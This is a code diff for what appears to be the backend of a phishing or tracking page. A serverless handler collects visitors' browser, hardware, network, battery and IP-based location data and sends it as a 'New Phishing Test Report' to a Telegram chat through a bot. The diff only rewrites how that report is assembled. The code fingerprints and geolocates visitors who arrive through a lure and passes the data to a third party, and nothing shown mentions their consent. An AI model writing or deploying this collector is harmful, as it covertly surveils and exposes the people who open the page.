@@ -6,44 +6,67 @@ export default async (req, res) => {
   try {
     const { telegramId, ...deviceInfo } = req.body;
     
-    // Validate token expiration here (if stored in database)
+    // Build message sections dynamically
+    const sections = [];
     
-    // Format the message with all collected data
-    const messageText = `
-📡 *New Phishing Test Report*
-
-🆔 *Chat ID*: ${telegramId}
-🕒 *Time*: ${new Date().toLocaleString()}
-
-🌐 *Basic Info*
-- Browser: ${deviceInfo.browser || 'N/A'}
-- Platform: ${deviceInfo.platform || 'N/A'}
-- Language: ${deviceInfo.language || 'N/A'}
-- Timezone: ${deviceInfo.timezone || 'N/A'}
-
-💻 *Hardware*
-- CPU: ${deviceInfo.cpu || 'N/A'}
-- RAM: ${deviceInfo.memory || 'N/A'}
-- Screen: ${deviceInfo.screen || 'N/A'}
-- WebGL: ${(deviceInfo.webgl?.vendor || 'N/A')} | ${(deviceInfo.webgl?.renderer || 'N/A')}
-
-📶 *Network*
-- Type: ${deviceInfo.network?.type || 'N/A'}
-- Speed: ${deviceInfo.network?.effectiveType || 'N/A'}
-- Downlink: ${deviceInfo.network?.downlink || 'N/A'} Mbps
-- Latency (RTT): ${deviceInfo.network?.rtt || 'N/A'} ms
-- Data Saver: ${deviceInfo.network?.saveData ? 'Enabled' : 'Disabled'}
-
-📍 *Approximate Location* (IP-based, not accurate)
-- IP: ${deviceInfo.ip || 'N/A'}
-- City: ${deviceInfo.city || 'N/A'}
-- Region: ${deviceInfo.region || 'N/A'}
-- Country: ${deviceInfo.country || 'N/A'}
-
-🔋 *Battery*
-- Level: ${deviceInfo.battery ? `${deviceInfo.battery}%` : 'N/A'}
-- Charging: ${deviceInfo.charging ? 'Yes' : 'No'}
-    `;
+    // Always include these basic fields
+    sections.push(
+      `📡 *New Phishing Test Report*`,
+      ``,
+      `🆔 *Chat ID*: ${telegramId}`,
+      `🕒 *Time*: ${new Date().toLocaleString()}`
+    );
+    
+    // Basic Info
+    const basicInfo = [];
+    if (deviceInfo.browser) basicInfo.push(`- Browser: ${deviceInfo.browser}`);
+    if (deviceInfo.platform) basicInfo.push(`- Platform: ${deviceInfo.platform}`);
+    if (deviceInfo.language) basicInfo.push(`- Language: ${deviceInfo.language}`);
+    if (deviceInfo.timezone) basicInfo.push(`- Timezone: ${deviceInfo.timezone}`);
+    if (basicInfo.length) sections.push(`\n🌐 *Basic Info*`, ...basicInfo);
+    
+    // Hardware Info
+    const hardwareInfo = [];
+    if (deviceInfo.cpu) hardwareInfo.push(`- CPU: ${deviceInfo.cpu}`);
+    if (deviceInfo.memory) hardwareInfo.push(`- RAM: ${deviceInfo.memory}`);
+    if (deviceInfo.screen) hardwareInfo.push(`- Screen: ${deviceInfo.screen}`);
+    if (deviceInfo.webgl?.vendor && deviceInfo.webgl?.renderer) {
+      hardwareInfo.push(`- WebGL: ${deviceInfo.webgl.vendor} | ${deviceInfo.webgl.renderer}`);
+    }
+    if (hardwareInfo.length) sections.push(`\n💻 *Hardware*`, ...hardwareInfo);
+    
+    // Network Info
+    const networkInfo = [];
+    if (deviceInfo.network?.type) networkInfo.push(`- Type: ${deviceInfo.network.type}`);
+    if (deviceInfo.network?.effectiveType) networkInfo.push(`- Speed: ${deviceInfo.network.effectiveType}`);
+    if (deviceInfo.network?.downlink) networkInfo.push(`- Downlink: ${deviceInfo.network.downlink} Mbps`);
+    if (deviceInfo.network?.rtt) networkInfo.push(`- Latency (RTT): ${deviceInfo.network.rtt} ms`);
+    if (deviceInfo.network?.saveData !== undefined) {
+      networkInfo.push(`- Data Saver: ${deviceInfo.network.saveData ? 'Enabled' : 'Disabled'}`);
+    }
+    if (networkInfo.length) sections.push(`\n📶 *Network*`, ...networkInfo);
+    
+    // Location Info
+    const locationInfo = [];
+    if (deviceInfo.ip) locationInfo.push(`- IP: ${deviceInfo.ip}`);
+    if (deviceInfo.city) locationInfo.push(`- City: ${deviceInfo.city}`);
+    if (deviceInfo.region) locationInfo.push(`- Region: ${deviceInfo.region}`);
+    if (deviceInfo.country) locationInfo.push(`- Country: ${deviceInfo.country}`);
+    if (locationInfo.length) {
+      sections.push(`\n📍 *Approximate Location* (IP-based, not accurate)`);
+      sections.push(...locationInfo);
+    }
+    
+    // Battery Info
+    const batteryInfo = [];
+    if (deviceInfo.battery) batteryInfo.push(`- Level: ${deviceInfo.battery}%`);
+    if (deviceInfo.charging !== undefined) {
+      batteryInfo.push(`- Charging: ${deviceInfo.charging ? 'Yes' : 'No'}`);
+    }
+    if (batteryInfo.length) sections.push(`\n🔋 *Battery*`, ...batteryInfo);
+    
+    // Join all sections
+    const messageText = sections.join('\n');
     
     // Send to Telegram
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
@@ -52,7 +75,7 @@ export default async (req, res) => {
       body: JSON.stringify({
         chat_id: telegramId,
         text: messageText,
-        parse_mode: 'Markdown' // Enable Markdown formatting
+        parse_mode: 'Markdown'
       })
     });
     
